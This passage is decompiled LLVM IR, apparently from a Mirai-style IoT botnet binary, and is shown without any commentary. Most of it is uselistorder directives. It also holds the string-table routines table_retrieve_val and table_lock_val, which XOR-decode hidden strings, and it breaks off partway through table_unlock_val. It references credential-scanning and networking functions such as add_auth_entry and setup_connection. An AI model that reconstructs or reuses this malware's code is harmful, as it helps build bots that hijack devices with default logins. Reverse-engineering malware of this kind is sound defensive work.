  uselistorder i32 %v2_804fd8322, { 1, 0 }
  uselistorder i32 %v3_804fd7a, { 0, 2, 1, 3 }
  uselistorder i32 %v7_804fd32, { 1, 0 }
  uselistorder i8 %v3_804fd32, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_804fd2b, { 0, 1, 2, 3, 4, 7, 6, 5 }
  uselistorder i32 %v0_804fd25, { 1, 0 }
  uselistorder i32 %v1_804fce8, { 2, 3, 4, 5, 6, 0, 1, 7, 8 }
  uselistorder i32 %v1_804fcd5, { 1, 0 }
  uselistorder i32 %v0_804fcd5, { 0, 2, 3, 1 }
  uselistorder i32 %v7_804fc6f, { 1, 0 }
  uselistorder i8 %v3_804fc6f, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_804fc68, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_804fc62, { 1, 0 }
  uselistorder i32 %v1_804fc2f, { 2, 3, 4, 5, 0, 1, 6, 7 }
  uselistorder i32 %v7_804fbbc, { 1, 0 }
  uselistorder i8 %v3_804fbbc, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_804fbb5, { 0, 1, 2, 3, 4, 7, 6, 5 }
  uselistorder i32 %v0_804fbaf, { 1, 0 }
  uselistorder i32 %v1_804fb6f, { 2, 3, 4, 5, 6, 0, 1, 7, 8 }
  uselistorder i32 %v7_804fafc, { 1, 0 }
  uselistorder i8 %v3_804fafc, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_804faf5, { 0, 1, 2, 3, 4, 7, 6, 5 }
  uselistorder i32 %v0_804faef, { 1, 0 }
  uselistorder i32 %v1_804faaf, { 2, 3, 4, 5, 6, 0, 1, 7, 8 }
  uselistorder i32 %v7_804fa3c, { 1, 0 }
  uselistorder i8 %v3_804fa3c, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_804fa35, { 0, 1, 2, 3, 4, 7, 6, 5 }
  uselistorder i32 %v0_804fa2f, { 1, 0 }
  uselistorder i32 %v1_804f9f0, { 2, 3, 4, 5, 6, 0, 1, 7, 8 }
  uselistorder i32 %v7_804f97d, { 1, 0 }
  uselistorder i8 %v3_804f97d, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_804f976, { 0, 1, 2, 3, 4, 7, 6, 5 }
  uselistorder i32 %v0_804f970, { 1, 0 }
  uselistorder i32 %v1_804f933, { 2, 3, 4, 5, 6, 0, 1, 7, 8 }
  uselistorder i32 %v7_804f8c0, { 1, 0 }
  uselistorder i8 %v3_804f8c0, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_804f8b9, { 0, 1, 2, 3, 4, 7, 6, 5 }
  uselistorder i32 %v0_804f8b3, { 1, 0 }
  uselistorder i32 %v1_804f876, { 2, 3, 4, 5, 6, 0, 1, 7, 8 }
  uselistorder i32 %v2_804f84d, { 1, 2, 0 }
  uselistorder i32 %v3_804f848, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v1_804f7a2, { 0, 2, 1 }
  uselistorder i32 %v0_804f79e, { 1, 0 }
  uselistorder i32 %v0_804f785, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v1_804f77b, { 1, 0 }
  uselistorder i32 %v0_804f70c, { 2, 1, 0 }
  uselistorder i32 %v1_804f709, { 2, 1, 0 }
  uselistorder i32 %v2_804f706, { 2, 1, 0 }
  uselistorder i32 %v3_804f6f6, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_8050185, { 6, 7, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v2_804f6a0, { 1, 0 }
  uselistorder i32 %v3_804f626, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804f624, { 1, 2, 3, 4, 0 }
  uselistorder i32 %stack_var_-1888.6, { 1, 2, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 %stack_var_-1892.6, { 1, 2, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 %v1_804f612, { 1, 0 }
  uselistorder i32 %v0_804f612, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-1888.5, { 1, 0 }
  uselistorder i32 %stack_var_-1892.5, { 1, 0 }
  uselistorder i32 %v2_804f5fd, { 1, 2, 0 }
  uselistorder i32 %v3_804f5fa, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80503a8, { 1, 0 }
  uselistorder i32 %v1_80503a5, { 2, 1, 0 }
  uselistorder i32 %v1_804f5e0, { 1, 0 }
  uselistorder i8 %.pre133, { 1, 0 }
  uselistorder i8 %.pre134, { 1, 0 }
  uselistorder i32 %v1_804f505, { 1, 0 }
  uselistorder i32 %v1_804f4f6, { 0, 2, 1 }
  uselistorder i32 %v0_804f4f6, { 1, 0 }
  uselistorder i32 %v0_804f503, { 0, 3, 2, 1 }
  uselistorder i32 %v2_804f4ee, { 1, 0 }
  uselistorder i32 %v1_804f4c9, { 1, 0 }
  uselistorder i32 %v0_804f4c9, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 %v3_804f4a2, { 1, 0, 2 }
  uselistorder i32 %v4_804f482, { 1, 2, 0 }
  uselistorder i32 %v3_804f451, { 1, 0, 2 }
  uselistorder i32 %v1_804f3f0, { 1, 0 }
  uselistorder i32 %stack_var_-1888.2, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-1892.2, { 0, 2, 3, 1 }
  uselistorder i32 %v0_804f36d, { 3, 2, 1, 0 }
  uselistorder i32 %v3_804f334, { 1, 0 }
  uselistorder i8 %v2_804f24a, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20 }
  uselistorder i32 %v2_804f241, { 4, 2, 5, 6, 3, 7, 0, 1 }
  uselistorder i32 %v1_804f239, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804f234, { 0, 3, 2, 1, 4 }
  uselistorder i32 %stack_var_-1888.1, { 1, 0, 2 }
  uselistorder i32 %stack_var_-1892.1, { 1, 0, 2, 3, 4 }
  uselistorder i32 %stack_var_-1888.0, { 1, 0 }
  uselistorder i32 %stack_var_-1892.0, { 1, 0 }
  uselistorder i32 %v1_804eeb7, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804ee84, { 1, 0, 2 }
  uselistorder i32 %v0_804ee6e, { 1, 0, 2 }
  uselistorder i32 %v12_804ee6b, { 1, 0 }
  uselistorder i32 %v3_804ee47, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804ee2f, { 1, 2, 3, 0 }
  uselistorder i32 %v3_804ee0f, { 1, 0 }
  uselistorder i32 %v1_804edaa, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804eda2, { 5, 6, 22, 10, 0, 1, 2, 3, 4, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 19, 7 }
  uselistorder i32 %v0_804eda1, { 5, 6, 21, 9, 0, 1, 2, 3, 4, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 18 }
  uselistorder i32 %v0_804eda0, { 3, 1, 2, 5, 6, 7, 18, 21, 13, 9, 10, 8, 11, 12, 14, 15, 16, 17, 19, 20, 4, 0 }
  uselistorder i32* %stack_var_-16, { 0, 38, 37, 48, 30, 29, 50, 42, 41, 24, 23, 47, 19, 31, 49, 43, 25, 1, 18, 17, 16, 5, 2, 10, 14, 36, 13, 15, 46, 28, 35, 12, 11, 45, 27, 34, 9, 8, 44, 26, 33, 7, 6, 40, 22, 32, 4, 3, 39, 21, 20, 51, 52 }
  uselistorder i32* %stack_var_-1916, { 2, 3, 1, 0, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-28, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 6, 35, 36, 37, 38, 39, 12, 13, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 40, 41, 42, 43, 44, 45, 46, 47, 48, 34, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69 }
  uselistorder i32* %ecx.global-to-local, { 35, 4, 5, 36, 37, 38, 39, 40, 9, 0, 1, 2, 3, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 57, 59 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 105, 106, 107, 108, 138, 98, 110, 111, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 112, 113, 114, 116, 115, 117, 118, 119, 120, 121, 122, 123, 124, 125, 212, 45, 46, 47, 48, 126, 127, 128, 129, 12, 9, 0, 10, 1, 13, 2, 3, 4, 5, 6, 7, 8, 11, 14, 15, 16, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 130, 131, 99, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 100, 101, 102, 103, 104, 132, 133, 134, 135, 136, 137, 213, 139, 140, 141, 142, 143, 144, 145, 148, 146, 147, 149, 150, 151, 152, 154, 157, 155, 156, 153, 109, 159, 158, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 198, 197, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 210, 209, 211 }
  uselistorder i16* @global_var_8057d8c.50, { 2, 1, 0 }
  uselistorder i32 ()* @getsockopt, { 2, 1, 0 }
  uselistorder i32 192, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 22, 21, 20, 19, 3, 2, 1, 0, 18, 7, 6, 5, 4, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8 }
  uselistorder i32 1884, { 0, 2, 1 }
  uselistorder i8 31, { 0, 7, 8, 2, 3, 4, 5, 6, 1 }
  uselistorder i8 -5, { 3, 0, 1, 2 }
  uselistorder i8 -3, { 6, 7, 8, 1, 0, 2, 3, 4, 5 }
  uselistorder i32 (i8)* @table_lock_val, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 28, 16, 29, 30, 15, 31, 32, 33, 34, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 11, 12, 13, 14, 35, 36, 37, 38 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 0, 1, 2, 3, 4, 5, 6, 7, 27, 13, 28, 29, 12, 30, 31, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 8, 9, 10, 11, 53, 54, 55, 50, 51, 52, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 1880, { 12, 0, 11, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 (i8)* @table_unlock_val, { 0, 1, 2, 3, 4, 5, 6, 7, 24, 13, 25, 26, 12, 27, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 8, 9, 10, 11, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i8 65, { 1, 0 }
  uselistorder i32 ()* @__libc_recv, { 9, 8, 7, 6, 5, 4, 0, 1, 3, 2 }
  uselistorder i32 ()* @__libc_select, { 2, 1, 0 }
  uselistorder i32 1572, { 1, 2, 0 }
  uselistorder i32 1700, { 1, 0, 2 }
  uselistorder i8 -1, { 3, 4, 5, 1, 2, 0 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 -28, { 4, 2, 5, 6, 3, 7, 8, 9, 0, 1 }
  uselistorder i32 -24, { 2, 0, 3, 4, 1, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i64 10, { 1, 0 }
  uselistorder i32 -6, { 2, 0, 1 }
  uselistorder i32 -15, { 1, 0 }
  uselistorder i32 ()* @add_auth_entry, { 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_8057d81.64, { 1, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_80558b2.63 to i32), { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i16* @global_var_8057d76.59, { 2, 0, 1 }
  uselistorder i8 6, { 0, 5, 3, 4, 6, 7, 8, 9, 10, 2, 1, 11 }
  uselistorder i8 16, { 3, 0, 1, 2 }
  uselistorder i8* @global_var_8057d80.57, { 1, 0 }
  uselistorder i16 (i16)* @llvm.bswap.i16, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32, 33, 27, 28, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 81, 82, 83, 79, 80, 84, 85, 86, 87, 88, 89, 92, 93, 94, 90, 91, 95, 96, 97, 98, 99, 100, 101, 102, 103 }
  uselistorder i32 (i32)* @rand_next, { 66, 65, 64, 63, 62, 61, 60, 59, 2, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 1, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 28, 0, 26, 27 }
  uselistorder i32 ()* @rand_init, { 1, 0 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 3, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80503e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f740.backedge, { 11, 12, 10, 1, 9, 2, 8, 3, 7, 4, 6, 5, 0 }
  uselistorder label %dec_label_pc_8050148, { 1, 0 }
  uselistorder label %dec_label_pc_804ffdf, { 1, 0 }
  uselistorder label %dec_label_pc_804fd83.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804fe03, { 5, 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_804fde2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804fdcf, { 1, 0 }
  uselistorder label %dec_label_pc_804fdbd, { 1, 0 }
  uselistorder label %dec_label_pc_804fdab, { 1, 0 }
  uselistorder label %dec_label_pc_804fd87, { 1, 0 }
  uselistorder label %dec_label_pc_804fd87.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804fd3a, { 4, 0, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_804fd2b, { 1, 0 }
  uselistorder label %dec_label_pc_804fcc6, { 6, 0, 7, 8, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_804fcb3, { 2, 3, 1, 0, 4, 5 }
  uselistorder label %dec_label_pc_804fc77, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_804fc68, { 1, 0 }
  uselistorder label %dec_label_pc_804fbc4, { 4, 0, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_804fbb5, { 1, 0 }
  uselistorder label %dec_label_pc_804fb04, { 4, 0, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_804faf5, { 1, 0 }
  uselistorder label %dec_label_pc_804fa44, { 4, 0, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_804fa35, { 1, 0 }
  uselistorder label %dec_label_pc_804f985, { 4, 0, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_804f976, { 1, 0 }
  uselistorder label %dec_label_pc_804f8c8, { 4, 0, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_804f8b9, { 1, 0 }
  uselistorder label %dec_label_pc_804f853, { 1, 0 }
  uselistorder label %dec_label_pc_804f7a7, { 1, 0 }
  uselistorder label %dec_label_pc_804f7a2, { 1, 0 }
  uselistorder label %dec_label_pc_804f760, { 1, 0 }
  uselistorder label %dec_label_pc_804f74b, { 1, 0 }
  uselistorder label %dec_label_pc_804f74b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f71f, { 1, 0 }
  uselistorder label %dec_label_pc_804f6c2, { 1, 0 }
  uselistorder label %dec_label_pc_804f603, { 3, 4, 0, 5, 2, 6, 1 }
  uselistorder label %dec_label_pc_804f5b5, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804f5a7, { 1, 0 }
  uselistorder label %dec_label_pc_804f514, { 1, 0 }
  uselistorder label %dec_label_pc_804f40a, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_804f3ff, { 1, 0 }
  uselistorder label %dec_label_pc_804f368, { 1, 0 }
  uselistorder label %dec_label_pc_804f299, { 3, 1, 4, 5, 2, 0 }
  uselistorder label %dec_label_pc_804f294.thread, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f234, { 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder label %dec_label_pc_804eeb2, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* @ecx, align 4
  %v2_8050418 = mul i32 %arg1, 8
  store i32 %v2_8050418, i32* @edx, align 4
  %v1_805041b = icmp eq i32* %arg2, null
  br i1 %v1_805041b, label %dec_label_pc_805042f, label %dec_label_pc_8050425

dec_label_pc_8050425:                             ; preds = %entry
  %v1_8050425 = add i32 %v2_8050418, add (i32 ptrtoint (i32* @global_var_805a880.100 to i32), i32 4)
  %v2_8050425 = inttoptr i32 %v1_8050425 to i32*
  %v3_8050425 = load i32, i32* %v2_8050425, align 4
  %v1_8050428 = urem i32 %v3_8050425, 65536
  store i32 %v1_8050428, i32* %arg2, align 4
  %v0_805042f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805042f

dec_label_pc_805042f:                             ; preds = %entry, %dec_label_pc_8050425
  %v0_805042f = phi i32 [ %v2_8050418, %entry ], [ %v0_805042f.pre, %dec_label_pc_8050425 ]
  %v1_805042f = add i32 %v0_805042f, ptrtoint (i32* @global_var_805a880.100 to i32)
  %v2_805042f = inttoptr i32 %v1_805042f to i32*
  %v3_805042f = load i32, i32* %v2_805042f, align 4
  ret i32 %v3_805042f

; uselistorder directives
  uselistorder i32 %v2_8050418, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805042f, { 1, 0 }
}

define i32 @table_lock_val(i8 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_8050449 = zext i8 %arg1 to i32
  %v1_805044d = mul nuw nsw i32 %v4_8050449, 8
  %v2_805044d = add i32 %v1_805044d, ptrtoint (i32* @global_var_805a880.100 to i32)
  store i32 %v2_805044d, i32* @ecx, align 4
  %v0_8050454 = load i16, i16* @global_var_8057ba4.101, align 2
  %v1_8050454 = sext i16 %v0_8050454 to i32
  %v1_8050459 = add i32 %v1_805044d, add (i32 ptrtoint (i32* @global_var_805a880.100 to i32), i32 4)
  %v2_8050459 = inttoptr i32 %v1_8050459 to i16*
  %v3_8050459 = load i16, i16* %v2_8050459, align 4
  %v4_8050459 = icmp eq i16 %v3_8050459, 0
  br i1 %v4_8050459, label %dec_label_pc_80504aa, label %dec_label_pc_8050460

dec_label_pc_8050460:                             ; preds = %entry
  store i32 %v1_8050454, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8050468 = udiv i32 %v1_8050454, 16777216
  %v2_805046b = udiv i32 %v1_8050454, 256
  store i32 %v2_805046b, i32* %edi.global-to-local, align 4
  %v5_805046e = trunc i32 %v2_8050468 to i8
  store i8 %v5_805046e, i8* %stack_var_-44, align 1
  %v2_8050471 = udiv i32 %v1_8050454, 65536
  store i32 %v2_8050471, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050474

dec_label_pc_8050474:                             ; preds = %dec_label_pc_8050474.dec_label_pc_8050474_crit_edge, %dec_label_pc_8050460
  %v0_805047a = phi i32 [ %v0_805047a.pre, %dec_label_pc_8050474.dec_label_pc_8050474_crit_edge ], [ %v1_8050454, %dec_label_pc_8050460 ]
  %v0_8050476 = phi i32 [ %v1_80504a6, %dec_label_pc_8050474.dec_label_pc_8050474_crit_edge ], [ 0, %dec_label_pc_8050460 ]
  %v0_8050474 = phi i32 [ %v0_805049e, %dec_label_pc_8050474.dec_label_pc_8050474_crit_edge ], [ %v2_805044d, %dec_label_pc_8050460 ]
  %v1_8050474 = inttoptr i32 %v0_8050474 to i32*
  %v2_8050474 = load i32, i32* %v1_8050474, align 4
  %v2_8050478 = add i32 %v2_8050474, %v0_8050476
  %v1_805047c = inttoptr i32 %v2_8050478 to i8*
  %v2_805047c = load i8, i8* %v1_805047c, align 1
  %v4_805047c = trunc i32 %v0_805047a to i8
  %v5_805047c = xor i8 %v2_805047c, %v4_805047c
  store i8 %v5_805047c, i8* %v1_805047c, align 1
  %v0_805047e = load i32, i32* %edx.global-to-local, align 4
  %v0_8050480 = load i32, i32* @ecx, align 4
  %v1_8050480 = inttoptr i32 %v0_8050480 to i32*
  %v2_8050480 = load i32, i32* %v1_8050480, align 4
  %v2_8050482 = add i32 %v2_8050480, %v0_805047e
  %v0_8050484 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050486 = inttoptr i32 %v2_8050482 to i8*
  %v2_8050486 = load i8, i8* %v1_8050486, align 1
  %v4_8050486 = trunc i32 %v0_8050484 to i8
  %v5_8050486 = xor i8 %v2_8050486, %v4_8050486
  store i8 %v5_8050486, i8* %v1_8050486, align 1
  %v0_8050488 = load i32, i32* %edx.global-to-local, align 4
  %v0_805048a = load i32, i32* @ecx, align 4
  %v1_805048a = inttoptr i32 %v0_805048a to i32*
  %v2_805048a = load i32, i32* %v1_805048a, align 4
  %v2_805048c = add i32 %v2_805048a, %v0_8050488
  %v0_805048e = load i32, i32* %esi.global-to-local, align 4
  %v1_8050490 = inttoptr i32 %v2_805048c to i8*
  %v2_8050490 = load i8, i8* %v1_8050490, align 1
  %v4_8050490 = trunc i32 %v0_805048e to i8
  %v5_8050490 = xor i8 %v2_8050490, %v4_8050490
  store i8 %v5_8050490, i8* %v1_8050490, align 1
  %v0_8050492 = load i32, i32* %edx.global-to-local, align 4
  %v0_8050494 = load i32, i32* @ecx, align 4
  %v1_8050494 = inttoptr i32 %v0_8050494 to i32*
  %v2_8050494 = load i32, i32* %v1_8050494, align 4
  %v1_8050496 = add i32 %v0_8050492, 1
  store i32 %v1_8050496, i32* %edx.global-to-local, align 4
  %v2_8050497 = add i32 %v2_8050494, %v0_8050492
  %v2_8050499 = load i8, i8* %stack_var_-44, align 1
  %v1_805049c = inttoptr i32 %v2_8050497 to i8*
  %v2_805049c = load i8, i8* %v1_805049c, align 1
  %v5_805049c = xor i8 %v2_805049c, %v2_8050499
  store i8 %v5_805049c, i8* %v1_805049c, align 1
  %v0_805049e = load i32, i32* @ecx, align 4
  %v1_805049e = add i32 %v0_805049e, 4
  %v2_805049e = inttoptr i32 %v1_805049e to i32*
  %v3_805049e = load i32, i32* %v2_805049e, align 4
  %v1_80504a1 = urem i32 %v3_805049e, 65536
  %v1_80504a6 = load i32, i32* %edx.global-to-local, align 4
  %v8_80504a8 = icmp sgt i32 %v1_80504a1, %v1_80504a6
  br i1 %v8_80504a8, label %dec_label_pc_8050474.dec_label_pc_8050474_crit_edge, label %dec_label_pc_80504aa.loopexit

dec_label_pc_8050474.dec_label_pc_8050474_crit_edge: ; preds = %dec_label_pc_8050474
  %v0_805047a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050474

dec_label_pc_80504aa.loopexit:                    ; preds = %dec_label_pc_8050474
  br label %dec_label_pc_80504aa

dec_label_pc_80504aa:                             ; preds = %dec_label_pc_80504aa.loopexit, %entry
  %v0_80504b1 = phi i32 [ %v1_80504a1, %dec_label_pc_80504aa.loopexit ], [ %v1_8050454, %entry ]
  ret i32 %v0_80504b1

; uselistorder directives
  uselistorder i32 %v1_80504a6, { 1, 0 }
  uselistorder i32 %v1_80504a1, { 1, 0 }
  uselistorder i32 %v0_805049e, { 1, 0 }
  uselistorder i32 %v1_8050454, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @table_unlock_val(i8 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_80504c9 = zext i8 %arg1 to i32
  %v1_80504cd = mul nuw nsw i32 %v4_80504c9, 8
  %v2_80504cd = add i32 %v1_80504cd, ptrtoint (i32* @global_var_805a880.100 to i32)
  store i32 %v2_80504cd, i32* @ecx, align 4
  %v0_80504d4 = load i16, i16* @global_var_8057ba4.101, align 2
  %v1_80504d4 = sext i16 %v0_80504d4 to i32
  %v1_80504d9 = add i32 %v1_80504cd, add (i32 ptrtoint (i32* @global_var_805a880.100 to i32), i32 4)
  %v2_80504d9 = inttoptr i32 %v1_80504d9 to i16*
  %v3_80504d9 = load i16, i16* %v2_80504d9, align 4
  %v4_80504d9 = icmp eq i16 %v3_80504d9, 0
  br i1 %v4_80504d9, label %dec_label_pc_805052a, label %dec_label_pc_80504e0

dec_label_pc_80504e0:                             ; preds = %entry
  store i32 %v1_80504d4, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_80504e8 = udiv i32 %v1_80504d4, 16777216
  %v2_80504eb = udiv i32 %v1_80504d4, 256
  store i32 %v2_80504eb, i32* %edi.global-to-local, align 4
  %v5_80504ee = trunc i32 %v2_80504e8 to i8
  store i8 %v5_80504ee, i8* %stack_var_-44, align 1
  %v2_80504f1 = udiv i32 %v1_80504d4, 65536
  store i32 %v2_80504f1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80504f4

dec_label_pc_80504f4:                             ; preds = %dec_label_pc_80504f4.dec_label_pc_80504f4_crit_edge, %dec_label_pc_80504e0
  %v0_80504fa = phi i32 [ %v0_80504fa.pre, %dec_label_pc_80504f4.dec_label_pc_80504f4_crit_edge ], [ %v1_80504d4, %dec_label_pc_80504e0 ]
  %v0_80504f6 = phi i32 [ %v1_8050526, %dec_label_pc_80504f4.dec_label_pc_80504f4_crit_edge ], [ 0, %dec_label_pc_80504e0 ]
  %v0_80504f4 = phi i32 [ %v0_805051e, %dec_label_pc_80504f4.dec_label_pc_80504f4_crit_edge ], [ %v2_80504cd, %dec_label_pc_80504e0 ]
  %v1_80504f4 = inttoptr i32 %v0_80504f4 to i32*
  %v2_80504f4 = load i32, i32* %v1_80504f4, align 4
  %v2_80504f8 = add i32 %v2_80504f4, %v0_80504f6
  %v1_80504fc = inttoptr i32 %v2_80504f8 to i8*
  %v2_80504fc = load i8, i8* %v1_80504fc, align 1
  %v4_80504fc = trunc i32 %v0_80504fa to i8
  %v5_80504fc = xor i8 %v2_80504fc, %v4_80504fc
  store i8 %v5_80504fc, i8* %v1_80504fc, align 1
  %v0_80504fe = load i32, i32* %edx.global-to-local, align 4
  %v0_8050500 = load i32, i32* @ecx, align 4
  %v1_8050500 = inttoptr i32 %v0_8050500 to i32*
  %v2_8050500 = load i32, i32* %v1_8050500, align 4
  %v2_8050502 = add i32 %v2_8050500, %v0_80504fe
  %v0_8050504 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050506 = inttoptr i32 %v2_8050502 to i8*
  %v2_8050506 = load i8, i8* %v1_8050506, align 1
  %v4_8050506 = trunc i32 %v0_8050504 to i8
